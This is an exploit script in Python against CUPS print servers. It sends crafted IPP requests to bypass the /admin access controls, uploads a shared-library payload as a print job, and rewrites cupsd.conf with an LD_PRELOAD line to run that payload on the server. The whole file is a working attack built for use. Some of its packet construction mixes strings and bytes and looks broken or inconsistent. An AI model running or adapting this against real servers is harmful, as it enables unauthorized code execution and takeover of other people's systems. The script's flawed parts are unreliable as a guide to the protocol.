import argparse
import re
import random
import time
from struct import *
import socket
from socket import *

parser = argparse.ArgumentParser(description='Optional app description')

parser.add_argument('--use_p', help="if present only the ACL attack is executed",
                    default=False, action='store_true')
parser.add_argument('--ip', help="the victim cups server ip", required=True)
parser.add_argument('--port', help="victim port (default 631)", default="631")
parser.add_argument('--payload', help="the payload path (.so)")

args = parser.parse_args()


class TCPSocket:
    def __init__(self, sock=None):
        if sock is None:
            self.sock = socket(
                AF_INET, SOCK_STREAM)
            self.sock.settimeout(30)
        else:
            self.sock = sock

    def connect(self, host, port):
        self.sock.connect((host, int(port)))

    def send_message(self, msg):
        self.sock.send(msg)

    def receive_message(self):
        tmp = self.sock.recv(1024)
        msg = ""
        while tmp:
            msg += tmp.decode("utf-8")
            tmp = self.sock.recv(1024)
        return msg


def main():
    # if True we need to charge a payload in the cups server
    is_used_payload = args.use_p
    target_ip = args.ip
    target_port = args.port
    payload_path = args.payload

    print("Getting first available printer name...")
    printer_name = retrieve_printers_connected(target_ip, target_port)
    attack_access_control_list(target_ip, target_port, printer_name)

    if is_used_payload:
        print("Payload attack...")
        payload = binary_payload_to_str_from_path(payload_path)
        job_id = perform_initial_job_request(
            target_ip, target_port, printer_name, payload)
        original_config = get_original_configuration(target_ip, target_port)
        new_evil_config = create_evil_configuration(original_config, job_id)

        print("Evil payload uploading...")
        replace_configuration_on_server(
            target_ip, target_port, new_evil_config)

        print("Payload attack done!")
        exit(0)


"""
It sends a GET request to the target's CUPS server, and if it finds a printer, it returns the
printer's name

:param target_ip: the IP address of the target
:param target_port: The port to connect to. Default is 631, defaults to 631 (optional)
:return: The printer name
"""


def retrieve_printers_connected(target_ip, target_port="631"):
    request = "GET /printers HTTP/1.1\r\n" \
              "Host: "+str(target_ip)+":"+str(target_port)+"\r\n" \
              "User-Agent: CUPS/2.0.2\r\n" \
              "Connection: Close\r\n\r\n"

    print("\nRequest for printers:\n"+request)
    request = request.encode('utf-8')

    response = perform_communication_with_socket(
        target_ip, int(target_port), request)

    if response is not None:
        # print(response)
        message = re.search(
            '<TR><TD><A HREF="(.+)">.+</A></TD><TD>.*</TD><TD>.*</TD><TD>.*</TD><TD>', response)
        if message is not None:
            printer = message.group(1)
            print("Printer found! " + printer)
            return printer

    print('problem')
    exit(1)


def attack_access_control_list(target_ip, target_port, printer):
    print("ACL attack...")
    i = random.randint(1, 1024)
    printer_url = "ipp://" + target_ip + ":" + target_port + printer
    src = '\x03'
    print([ord(c) for c in src])
    admin_payload = ("20"  # vers 2.0
                     "05" +  # op id: Create Job (0x0005)
                     str((i + 1)) +
                     "1"  # op attributes marker
                     "G"  # charset
                     "018"  # name len: 18
                     "attributes-charset"
                     "08"  # val len: 8
                     "us-ascii"
                     "72"  # natural language
                     "027"  # name len: 27
                     "attributes-natural-language"
                     "06"  # val len: 6
                     "/admin"
                     "69"  # printer-uri
                     "011"  # name len 11
                     "printer-uri" +
                     str(len(printer_url)) + printer_url +
                     "66"  # name without lang
                     "020"  # name len: 20
                     "requesting-user-name"
                     "06"  # val len: 6
                     "/admin"
                     "2"  # job attrs marker
                     "33"  # integer
                     "06"  # name len: 6
                     "copies"
                     "04"  # val len: 4
                     "0001"  # 1
                     "66"  # name w/o lang
                     "025"  # name len: 25
                     "job-originating-host-name"
                     "010"  # val len: 10
                     "teststring"
                     "66"  # name w/o lang
                     "025"  # name len: 25
                     "job-originating-host-name"
                     "010"  # val len: 10
                     "teststring"
                     "66"  # name w/o lang
                     "025"  # name len: 25
                     "job-originating-host-name"
                     "010"  # val len: 10
                     "teststring"
                     "66"  # name w/o lang
                     "025"  # name len: 25
                     "job-originating-host-name"
                     "010"  # val len: 10
                     "teststring"
                     "66"  # name w/o lang
                     "025"  # name len: 25
                     "job-originating-host-name"
                     "010"  # val len: 10
                     "teststring"
                     "66"  # name w/o lang
                     "025"  # name len: 25
                     "job-originating-host-name"
                     "010"  # val len: 10
                     "teststring"
                     "66"  # name w/o lang
                     "025"  # name len: 25
                     "job-originating-host-name"
                     "010"  # val len: 10
                     "teststring"
                     "66"  # name w/o lang
                     "025"  # name len: 25
                     "job-originating-host-name"
                     "010"  # val len: 10
                     "teststring"
                     "66"  # name w/o lang
                     "025"  # name len: 25
                     "job-originating-host-name"
                     "010"  # val len: 10
                     "teststring"
                     "66"  # name w/o lang
                     "025"  # name len: 25
                     "job-originating-host-name"
                     "010"  # val len: 10
                     "teststring"
                     "66"  # name w/o lang
                     "025"  # name len: 25
                     "job-originating-host-name"
                     "010"  # val len: 10
                     "teststring"
                     "66"  # name w/o lang
                     "025"  # name len: 25
                     "job-originating-host-name"
                     "010"  # val len: 10
                     "teststring"
                     "54"  # nwl
                     "00"  # name len: 0
                     "022"  # val len: 22
                     "06"  # length
                     "/admin"
                     "09"
                     "finaltest"
                     "3")  # end of attributes

    admin_configuration_payload = ("\x02\x00"  # vers 2.0
                                   "\x00\x05" +  # op id: Create Job (0x0005)
                                   str((i + 2)) +
                                   "\x01"  # op attributes marker
                                   "\x47"  # charset
                                   "\x00\x12"  # name len: 18
                                   "attributes-charset"
                                   "\x00\x08"  # val len: 8
                                   "us-ascii"
                                   "\x48"  # natural language
                                   "\x00\x1b"  # name len: 27
                                   "attributes-natural-language"
                                   "\x00\x0b"  # val len: 11
                                   "/admin/conf"
                                   "\x45"  # printer-uri
                                   "\x00\x0b"  # name len 11
                                   "printer-uri" +
                                   str(len(printer_url)) + printer_url +
                                   "\x42"  # name without lang
                                   "\x00\x14"  # name len: 20
                                   "requesting-user-name"
                                   "\x00\x0b"  # val len: 11
                                   "/admin/conf"
                                   "\x02"  # job attrs marker
                                   "\x21"  # integer
                                   "\x00\x06"  # name len: 6
                                   "copies"
                                   "\x00\x04"  # val len: 4
                                   "\x00\x00\x00\x01"  # 1
                                   "\x42"  # name w/o lang
                                   "\x00\x19"  # name len: 25
                                   "job-originating-host-name"
                                   "\x00\x0c"  # val len: 12
                                   "AAAAAAAAAAAA"
                                   "\x42"  # nwol
                                   "\x00\x00"  # name len: 0
                                   "\x00\x0c"  # val len: 12
                                   "AAAAAAAAAAAA"
                                   "\x42"  # nwol
                                   "\x00\x00"  # name len: 0
                                   "\x00\x0c"  # val len: 12
                                   "AAAAAAAAAAAA"
                                   "\x42"  # nwol
                                   "\x00\x00"  # name len: 0
                                   "\x00\x0c"  # val len: 12
                                   "AAAAAAAAAAAA"
                                   "\x42"  # nwol
                                   "\x00\x00"  # name len: 0
                                   "\x00\x0c"  # val len: 12
                                   "AAAAAAAAAAAA"
                                   "\x42"  # nwol
                                   "\x00\x00"  # name len: 0
                                   "\x00\x0c"  # val len: 12
                                   "AAAAAAAAAAAA"
                                   "\x42"  # nwol
                                   "\x00\x00"  # name len: 0
                                   "\x00\x0c"  # val len: 12
                                   "AAAAAAAAAAAA"
                                   "\x42"  # nwol
                                   "\x00\x00"  # name len: 0
                                   "\x00\x0c"  # val len: 12
                                   "AAAAAAAAAAAA"
                                   "\x42"  # nwol
                                   "\x00\x00"  # name len: 0
                                   "\x00\x0c"  # val len: 12
                                   "AAAAAAAAAAAA"
                                   "\x42"  # nwol
                                   "\x00\x00"  # name len: 0
                                   "\x00\x0c"  # val len: 12
                                   "AAAAAAAAAAAA"
                                   "\x42"  # nwol
                                   "\x00\x00"  # name len: 0
                                   "\x00\x0c"  # val len: 12
                                   "AAAAAAAAAAAA"
                                   "\x42"  # nwol
                                   "\x00\x00"  # name len: 0
                                   "\x00\x0c"  # val len: 12
                                   "AAAAAAAAAAAA"
                                   "\x36"  # nwl
                                   "\x00\x00"  # name len: 0
                                   "\x00\x1b"  # val len: 27
                                   "\x00\x0b"  # length
                                   "/admin/conf"
                                   "\x00\x0c"
                                   "BBBBBBBBBBBB"
                                   "\x03")  # end of attributes
    print(str(admin_configuration_payload))
    http_admin_uri_header = "POST " + printer + " HTTP/1.1\r\n"\
                            "Content-Type: application/ipp\r\n"\
                            "Host: " + target_ip + ":" + target_port + "\r\n"\
                            "User-Agent: CUPS/2.0.2\r\n"\
                            "Connection: Close\r\n"\
                            "Content-Length: " + \
        str(len(admin_payload)) + "\r\n\r\n"

    print("\n\n"+admin_payload)
    http_admin_conf_uri_header = "POST " + printer + " HTTP/1.1\r\n"\
        "Content-Type: application/ipp\r\n"\
        "Host: " + target_ip + ":" + target_port + "\r\n"\
        "User-Agent: CUPS/2.0.2\r\n"\
        "Connection: Close\r\n"\
        "Content-Length: " + \
        str(len(admin_configuration_payload)) + "\r\n\r\n"

    # print("Attack on /admin>:\n" +
    #     http_admin_uri_header + admin_payload)
    print("Response <:\n" + perform_communication_with_socket(target_ip,
                                                              target_port,
                                                              http_admin_uri_header + admin_payload))
    time.sleep(1)
    # print("Attack on /admin/conf >:\n" +
    #      http_admin_conf_uri_header + admin_configuration_payload)
    print("Response <:\n" + perform_communication_with_socket(target_ip,
                                                              target_port,
                                                              http_admin_conf_uri_header + admin_configuration_payload))

    http_header_check = ("GET /admin HTTP/1.1\x0d\x0a"
                         "Host: " + target_ip + ":" + target_port + "\x0d\x0a"
                                                                    "User-Agent: CUPS/2.0.2\x0d\x0a"
                                                                    "Connection: Close\x0d\x0a"
                                                                    "\x0d\x0a")
    print("Checking if attack on /admin works")
    # print("Check request >:\n" +
    #      http_header_check)
    check_message_result = perform_communication_with_socket(
        target_ip, target_port, http_header_check)
    print("Response <:\n" +
          check_message_result)

    status = re.search('200 OK', check_message_result)
    if status is not None:
        print("Access Control List attack successful, you have the access now to /admin and /admin/conf")
    else:
        print("ACL attack failed\n")
        exit(1)


"""
It takes a path to a binary file and returns the binary data as a string

:param payload_path: the path to the binary file you want to send
:type payload_path: str
:return: The payload is being returned.
"""


def binary_payload_to_str_from_path(payload_path):
    payload = None
    # opening a binary file
    with open(payload_path, 'rb') as f:
        payload = f.read()
    if payload is not None:
        print("Payload:\n" + payload)
    else:
        print("Problem with the payload")
    return payload


"""
It sends a create job request to the target printer, then it sends it to the target
printer, and then it returns the job id

:param target_ip: the IP address of the target
:param target_port: The port that the CUPS server is listening on
:param printer: the printer name
:param payload: the payload to be sent to the target
:return: The job id
"""


def perform_initial_job_request(target_ip, target_port, printer, payload):
    i = random.randint(1, 3)
    request_id_job = str(pack(">i", (i + 2)))
    print("\n\n" + request_id_job + "\n\n")
    job_id = ''

    printer_uri = "ipp://" + target_ip + ":" + str(target_port) + printer

    job_packet = ("\x02\x00"
                  "\x00\x05" +
                  request_id_job +
                  "\x01"
                  "\x47" + "\x00\x12" + "attributes-charset" + "\x00\x05" + "utf-8"
                                                                            "\x48" + "\x00\x1b" + "attributes-natural-language" + "\x00\x05" + "en-us"
                                                                                                                                               "\x45" + "\x00\x0b" + "printer-uri" + str(
                                                                                                                                                   pack(">h", len(printer_uri))) + printer_uri +
                  "\x42" + "\x00\x14" + "requesting-user-name" + "\x00\x04" + "root"
                  "\x42" + "\x00\x08" + "job-name" + "\x00\x06" + "badlib"
                  "\x02"
                  "\x21" + "\x00\x06" + "copies" + "\x00\x04" + "\x00\x00\x00\x01"
                  "\x23" + "\x00\x0a" + "finishings" + "\x00\x04" + "\x00\x00\x00\x03"
                  "\x42" + "\x00\x10" + "job-cancel-after" + "\x00\x05" + "\x31\x30\x38\x30\x30"
                  "\x44" + "\x00\x0e" + "job-hold-until" + "\x00\x0a" + "indefinite"
                  "\x21" + "\x00\x0c" + "job-priority" + "\x00\x04" + "\x00\x00\x00\x32"
                  "\x42" + "\x00\x0a" + "job-sheets" + "\x00\x04" +
                  "none" + "\x42" + "\x00\x00\x00\x04" + "none"
                                                         "\x21" + "\x00\x09" + "number-up" + "\x00\x04" + "\x00\x00\x00\x01"
                                                                                                          "\x03")

    http_header_job_request = ("POST " + printer + " HTTP/1.1\x0d\x0a"
                                                   "Content-Type: application/ipp\x0d\x0a"
                                                   "Host: " + target_ip + ":" +
                               str(target_port) + "\x0d\x0a"
                                                  "User-Agent: CUPS/2.0.2\x0d\x0a"
                                                  "Connection: Close\x0d\x0a"
                                                  "Content-Length: " +
                               str(len(job_packet) + 0) + "\x0d\x0a"
                                                          "\x0d\x0a")

    job_request = http_header_job_request + job_packet
    response_job_request = perform_communication_with_socket(
        target_ip, int(target_port), job_request)

    if response_job_request is not None:
        response_check_str = re.search("ipp://" + target_ip + ":" +
                                       str(target_port) + "/jobs/(\d+)", response_job_request)
        if response_check_str is not None:
            job_id = response_check_str.group(1)
    else:
        print("Problem with the job request")
        exit()

    print("\n" + response_job_request + "\n")

    print_request_id = str(pack(">i", (i + 3)))
    document_to_print_packet = ("\x02\x00"
                                "\x00\x06" +
                                print_request_id +
                                "\x01"
                                "\x47" + "\x00\x12" + "attributes-charset" + "\x00\x05" + "utf-8"
                                                                                          "\x48" + "\x00\x1b" + "attributes-natural-language" + "\x00\x05" + "en-us"
                                                                                                                                                             "\x45" + "\x00\x0b" + "printer-uri" + str(
                                                                                                                                                                 pack(">h", len(printer_uri))) + printer_uri +
                                "\x21" + "\x00\x06" + "job-id" + "\x00\x04" + str(pack(">i", int(job_id))) +
                                "\x42" + "\x00\x14" + "requesting-user-name" + "\x00\x04" + "root"
                                                                                            "\x42" + "\x00\x0d" + "document-name" + "\x00\x06" + "evil_payload"
                                                                                                                                                 "\x49" + "\x00\x0f" + "document-format" +
                                "\x00\x18" + "application/octet-stream"
                                "\x22" + "\x00\x0d" + "last-document" + "\x00\x01" + "\x01"
                                "\x03" +
                                payload)
    print_request_http_header = ("POST " + printer + " HTTP/1.1\x0d\x0a"
                                                     "Content-Type: application/ipp\x0d\x0a"
                                                     "Host: " + target_ip + ":" +
                                 str(target_port) + "\x0d\x0a"
                                                    "User-Agent: CUPS/2.0.2\x0d\x0a"
                                                    "Connection: Close\x0d\x0a"
                                                    "Content-Length: " +
                                 str(len(document_to_print_packet) + 0) +
                                 "\x0d\x0a"
                                 "\x0d\x0a")

    print_request = print_request_http_header + document_to_print_packet
    print_response = perform_communication_with_socket(
        target_ip, int(target_port), print_request)

    print("\n" + print_response + "\n")
    return job_id


"""
It sends a request to the target server to obtain the original configuration file

:param target_ip: The IP address of the target
:param target_port: The port that the CUPS service is running on
:return: The original configuration file.
"""


def get_original_configuration(target_ip, target_port):
    i = random.randint(1, 1024)
    original_config = ""
    http_request = ("GET /admin/conf/cupsd.conf HTTP/1.1\x0d\x0a"
                    "Host: " + target_ip + ":" + target_port + "\x0d\x0a"
                                                               "User-Agent: CUPS/2.0.2\x0d\x0a"
                                                               "Connection: Close\x0d\x0a"
                                                               "\x0d\x0a")

    print("Obtaining original configuration file...")
    response = perform_communication_with_socket(
        target_ip, target_port, http_request)
    response_array = response.split("\x0d\x0a\x0d\x0a")
    original_config = response_array[1]
    print("Configuration file:\n" + original_config + "\n")
    return original_config


"""
It takes a string, appends two newlines, and then appends a string that contains the name of the
file we want to create

:param config: The configuration file to be modified
:param name: The name of the printer
:return: The configuration file with the evil configuration appended to it.
"""


def create_evil_configuration(config, name):
    config = config + "\x0a\x0aSetEnv LD_PRELOAD /var/spool/cups/d000" + name + "-001\x0a"
    return config


"""
It takes a string, converts each character to hex, and then creates a visualization of the hex and
ASCII characters

:param input_str: The string that you want to visualize
:type input_str: str
:return: A string that is a visual representation of the hex and ascii values of the input string.
"""


def create_visualization_message(input_str):
    hex_encoded_chars = []
    ascii_message_visualization = []
    final_message = ''
    char_list = list(input_str)

    for char in char_list:
        hex_encoded_chars.append(char.encode("hex"))
        if char == '0x0':
            ascii_message_visualization.append('0')
        elif 30 > ord(char) or ord(char) > 128:
            ascii_message_visualization.append('..')
        elif 30 < ord(char) or ord(char) < 128:
            ascii_message_visualization.append(char)

    i = 0
    while i < len(hex_encoded_chars):
        if (len(hex_encoded_chars) - i) >= 16:
            final_message += ' '.join(hex_encoded_chars[i:i + 16])
            final_message += "         "
            final_message += ' '.join(ascii_message_visualization[i:i + 16])
            final_message += "\n"
            i = i + 16
        else:
            final_message += ' '.join(
                hex_encoded_chars[i:(len(hex_encoded_chars) - 0)])
            pad = len(
                ' '.join(hex_encoded_chars[i:(len(hex_encoded_chars) - 0)]))
            final_message += ' ' * (56 - pad)
            final_message += ' '.join(
                ascii_message_visualization[i:(len(hex_encoded_chars) - 0)])
            final_message += "\n"
            i = i + len(hex_encoded_chars)

    return final_message


"""
> This function takes an IP address, a port, a protocol, and a packet to send, and returns a
response packet

:param ip: the ip address of the server
:param port: The port number to connect to
:param protocol: The protocol to use
:type protocol: str
:param packet_to_send: This is the packet that you want to send to the server
:return: The response packet
"""


def perform_communication_with_socket(ip, port, packet_to_send):
    sock = TCPSocket()
    sock.connect(ip, port)

    sock.send_message(packet_to_send)
    response_packet = sock.receive_message()
    return response_packet


"""
It sends a PUT request to the CUPS server, which contains the configuration file that we want to
upload

:param target_ip: The IP address of the target server
:param target_port: The port that the CUPS server is listening on
:param config: The configuration file to upload to the server
"""


def replace_configuration_on_server(target_ip, target_port, config):
    http_request = ("PUT /admin/conf/cupsd.conf HTTP/1.1\x0d\x0a"
                    "Content-Type: application/ipp\x0d\x0a"
                    "Host: " + target_ip + ":" + target_port + "\x0d\x0a"
                                                               "User-Agent: CUPS/2.0.2\x0d\x0a"
                                                               "Connection: Keep-Alive\x0d\x0a"
                                                               "Content-Length: " +
                    str(len(config)) + "\x0d\x0a"
                    "\x0d\x0a")
    print("Uploading evil configuration on server...")
    print("Request PUT new configuration>:\n" +
          (http_request + config))
    print("Response <:\n" + perform_communication_with_socket(target_ip,
                                                              target_port,
                                                              http_request + config))


if __name__ == "__main__":
    main()
